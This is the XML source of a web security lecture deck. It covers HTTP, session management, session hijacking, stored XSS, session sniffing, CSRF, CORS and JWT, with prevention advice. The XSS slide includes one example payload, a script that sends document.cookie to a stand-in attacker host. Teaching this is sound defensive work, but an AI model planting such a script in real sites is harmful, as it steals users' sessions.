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75" r:id="rId16"/>
    <p:sldId id="270" r:id="rId17"/>
    <p:sldId id="267" r:id="rId18"/>
    <p:sldId id="268" r:id="rId19"/>
    <p:sldId id="279" r:id="rId20"/>
    <p:sldId id="269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2BD9F-30D3-4575-BD62-691B0822399C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0222B-76CC-4F72-A4C7-DC7166C983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ure53/DOMPurif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John Philip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Server Architecture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8001056" cy="485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Interactive software accessed via a web browser over the internet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Users can perform tasks, manipulate data, and access services without installation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Two Types - Static and Dynamic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The primary difference between static and dynamic websites lies in how the server delivers content to the user.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324"/>
            <a:ext cx="8229600" cy="1011222"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Static </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>vs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Dynamic Website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071546"/>
            <a:ext cx="3061629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928934"/>
            <a:ext cx="7286676" cy="3531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Hypertext Transfer Protocol(HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) is the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>protocol </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>for transmitting web data (HTML, images, videos) between a client (like a browser) and a server, operating on a request-response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uses stateless system to load Web Pages using TCP port 80.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 smtClean="0"/>
              <a:t>HTTP – Key Aspects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07209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Client-Server Model:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A client (e.g., user browser) sends a request, and the server returns the requested data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Components:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Requests consist of methods (GET, POST, etc.) and URLs, while responses provide status codes and data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Statelessness:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP is stateless, meaning each request is treated independently, not retaining information from previous interactions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HTTP vs. HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP transfers data in plain text, making it insecure, whereas HTTP Secure (HTTPS) uses encryption (SSL/TLS) to secure data, providing authentication and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Stateless and FTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Statefull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HTTP is stateless. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Each request from a client to a server is treated as an independent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>transaction. Connection is not Continuous.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>FTP is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>stateful</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>. Maintains a continuous connection between the client and Server (port 21)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP is for web browsing and retrieving content to display in browsers. FTP is used for uploading/downloading files and backups.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HTTP is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>stateless (server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>treats every request as independent and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>forgets </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>previous </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>interactions) state </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>must be managed at the application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>layer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>State can be maintained by Cookies, Session Management, JSON Web Tokens (JWT), Hidden Form Fields and Web Storage (Local / Session Storage).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Management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5922" y="1719282"/>
            <a:ext cx="622935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Hijacking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session stealing attack (or session hijacking) occurs when an attacker steals a user's active session token—often stored as a browser cookie—to impersonate them.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allows the attacker to gain unauthorized access to accounts, bypass multi-factor authentication (MFA), and steal data without needing the user's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>password.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of Session Hijacking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Cross-Site Scripting (XSS):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Injecting malicious scripts into trusted websites to steal cookies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session Sniffing:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Intercepting session tokens over unencrypted networks (HTTP).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Malware/Browser-in-the-Middle (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>BitM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Using malicious browser extensions or software to copy session cookies directly from the browser's storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Physical Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Directly accessing a user's device.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3200"/>
            <a:ext cx="8229600" cy="939784"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Stored (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Persistance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) XSS Attack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57850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Malicious script is permanently saved on a target server (e.g., in a database) and served to users when they view the stored content.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Example Scenario: Product Review Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t> An attacker leaves a product review on an e-commerce site containing a malicious script:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" baseline="30000" dirty="0" err="1" smtClean="0"/>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>('http://attacker.com/steal?cookie=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" baseline="30000" dirty="0" err="1" smtClean="0"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>); &lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Storage:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t> The application fails to sanitize this input and stores the script directly in the database.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Execution:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t> When other users visit the product page, the server loads the malicious script from the database and delivers it to their browsers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t> Every visitor to that page automatically executes the script, which silently sends their session cookies to the attacker’s server, allowing for session hijacking.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b="1" dirty="0"/>
              <a:t>XSS Prevention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500726"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Output Encoding:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Transform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" err="1"/>
              <a:t>untrusted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> input into a safe form where the browser interprets it as data, not code. Use HTML, JavaScript, CSS, or URL encoding depending on the context</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Input Validation &amp; Sanitization:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Implement strict </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" err="1"/>
              <a:t>allowlists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> for input validation (e.g., only accepting alphanumeric characters). Sanitize HTML input using trusted libraries like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" err="1">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> to remove dangerous tags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Content Security Policy (CSP):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Implement a robust CSP header to restrict where scripts can be loaded from, reducing the impact of XSS vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Use Secure Frameworks:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Utilize modern web frameworks (e.g., React, Angular) that automatically escape data, preventing many XSS vulnerabilities by default</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" baseline="30000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Set Cookie Flags:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> flag for session cookies to ensure they cannot be accessed via client-side scripts (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" baseline="30000" dirty="0"/>
              <a:t>Context-Aware Output Escaping:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="30000" dirty="0"/>
              <a:t> Ensure data is escaped according to where it is placed—within HTML body, attributes, JavaScript, or CSS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Session Sniffing (Session </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Sidejacking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Attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>monitors network traffic to intercept a user's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>active </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>session ID or cookie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Websites </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use session tokens to keep users logged in without re-entering passwords for every page, stealing this token allows an attacker to impersonate the victim and gain full access to their account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US" dirty="0" smtClean="0"/>
              <a:t>How Session Sniffing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42928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Network Monitoring:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The attacker uses "packet sniffing" tools (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcpdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) to eavesdrop on data traveling over a network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Intercepting the Token:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> If the victim's connection to a website is unencrypted (HTTP) or only partially encrypted, the session ID is transmitted as plain text. The attacker "sniffs" these data packets to find the cookie or token.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session Hijacking:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The attacker imports the stolen session token into their own browser. The server, seeing a valid token, believes the attacker is the legitimate user and allows them to perform actions such as transferring funds or accessing private data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Session Hijacking – Prevention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Regenerate IDs:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Change the session ID immediately after a user logs in to prevent session fixation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cookie Security:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> flag to prevent client-side script access (mitigating XSS) and the Secure flag to ensure cookies are only transmitted over HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Attribute:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=Strict or Lax to prevent Cross-Site Request Forgery (CSRF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Short </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Timeouts:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set absolute and idle timeouts to reduce the window of opportunity for an attacker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CSRF (Cross Site Request Forgery)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 smtClean="0"/>
              <a:t>CSRF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is a web security vulnerability that tricks an authenticated user into unknowingly executing unwanted actions on a web application, such as changing passwords, updating emails, or transferring funds.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exploits the trust a site has in a user's browser, typically using malicious links or scripts.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CSRF Attack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Victim Logs In:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The user logs into a vulnerable website (e.g., bank.com) and receives a session cookie.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacker Lures User:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> While still logged in, the user visits a malicious website (e.g., attacker.com).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Forged Request:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The malicious site sends a hidden HTTP request (e.g., &lt;form&gt;) to bank.com to perform an action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Browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Automatic Action:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The browser automatically includes the user's session cookies for bank.com, making the request appear authentic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Action </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Executed:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The bank treats this as a legitimate request from the user and executes it.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CSRF Attack - Example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0663" y="1643050"/>
            <a:ext cx="6162675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 CSRF Attack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CSRF Tokens:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use unique, secret, and unpredictable tokens for every request, which the server validates (e.g., {% </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>csrf_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> %} in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Django</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Cookie Attribute:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set cookies to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=Strict or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=Lax to prevent the browser from sending cookies with cross-site requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Re-authentication:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Require users to re-enter their password for sensitive actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Custom Request Headers:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use JavaScript to add custom headers (e.g., X-Requested-With) that are difficult to forge across origins.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CORS (Cross Origin Resource Sharing)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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>rowser-enforced security mechanism that uses HTTP headers to allow web apps on one domain to access resources from another, bypassing the same-origin policy. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>It protects users by allowing servers to explicitly white-list external origins for API requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>allows a browser to request resources from a different domain than the one that served the frontend, bypassing the Same-Origin Policy. It works by the server sending an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Access-Control-Allow-Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>header.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 smtClean="0"/>
              <a:t>JWT (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Web Token)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357850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Stateless</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, secure method for transmitting information between parties as a compact, digitally signed JSON </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>object.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It allows servers to verify user identity without storing session data, making it highly scalable for APIs and modern web applications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Structure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Comprised of three base64url-encoded parts separated by dots: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (algorithm/type), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (claims/user data), and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Signature</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (verifies integrity).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JWT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logs in with credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Server verifies credentials and generates a signed JWT.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client stores the token (e.g., in local storage or cookies).Client sends the JWT in the Authorization: Bearer &lt;token&gt; header for subsequent requests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Server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>validates the signature, ensuring the token is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>untampered</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and authorized.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590</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>91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Web Security</vt:lpstr>
      <vt:lpstr>Client Server Architecture</vt:lpstr>
      <vt:lpstr>Web Application</vt:lpstr>
      <vt:lpstr>Static vs Dynamic Website</vt:lpstr>
      <vt:lpstr>HTTP</vt:lpstr>
      <vt:lpstr>HTTP – Key Aspects</vt:lpstr>
      <vt:lpstr>HTTP Stateless and FTP Statefull</vt:lpstr>
      <vt:lpstr>State Maintenance</vt:lpstr>
      <vt:lpstr>Session Management</vt:lpstr>
      <vt:lpstr>Session Hijacking</vt:lpstr>
      <vt:lpstr>Methods of Session Hijacking</vt:lpstr>
      <vt:lpstr>Stored (Persistance) XSS Attack</vt:lpstr>
      <vt:lpstr>XSS Prevention Techniques</vt:lpstr>
      <vt:lpstr>Session Sniffing (Session Sidejacking)</vt:lpstr>
      <vt:lpstr>How Session Sniffing Works</vt:lpstr>
      <vt:lpstr>Session Hijacking – Prevention Strategies</vt:lpstr>
      <vt:lpstr>CSRF (Cross Site Request Forgery)</vt:lpstr>
      <vt:lpstr>How CSRF Attack Works</vt:lpstr>
      <vt:lpstr>CSRF Attack - Example</vt:lpstr>
      <vt:lpstr>Prevent CSRF Attack</vt:lpstr>
      <vt:lpstr>CORS (Cross Origin Resource Sharing)</vt:lpstr>
      <vt:lpstr>JWT (Json Web Token)</vt:lpstr>
      <vt:lpstr>How JWT Works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Security</dc:title>
  <dc:creator>Admin</dc:creator>
  <cp:lastModifiedBy>Admin</cp:lastModifiedBy>
  <cp:revision>43</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-10T06:02:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-10T13:25:02Z</dcterms:modified>
</cp:coreProperties>
</file>